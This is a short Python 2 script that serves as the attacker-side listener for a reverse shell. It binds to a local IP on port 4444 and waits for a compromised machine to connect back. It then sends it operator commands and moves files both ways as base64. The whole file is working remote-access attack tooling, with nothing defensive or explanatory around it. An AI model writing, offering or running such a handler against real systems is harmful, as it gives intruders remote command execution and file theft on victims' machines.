#!/usr/bin/env python2

import socket
import json
import base64
import os
import shlex

class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.ip, self.port))
        self.listener.listen(0)                                      
        print("[+]Waiting for Connection")
        self.connection, address = self.listener.accept()
        print("[+]Connection Established with " + str(address))

    def send(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data)        

    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def list_to_string(self, str_list):
        string = ""
        for num in range(1,len(str_list)):
            string = string + str_list[num] + " "
            if str_list[num] == len(str_list):
                string = string + str_list[num]
        return string

    def read_file(self, name):
        with open(name[1], "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, command, content):
        name = self.list_to_string(command)       
        with open(name, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+]Download Successful"

    def process(self,command):
        self.send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.recieve()

    def execute(self):
        while True:
            cmd = raw_input(":$ ")
            cmd = shlex.split(cmd)
            for s in cmd:
                print(s)
            try:
                if cmd[0] == "upload":
                    file = self.read_file(cmd)
                    cmd.append(file)
                result = self.process(cmd)
                if cmd[0] == "download" and "[-]Error " not in result:
                    result = self.write_file(cmd, result)
            except Exception:
                 print("[-]Error something went wrong")
            print(result)


listener = Listener("192.168.124.132", 4444)
listener.execute()
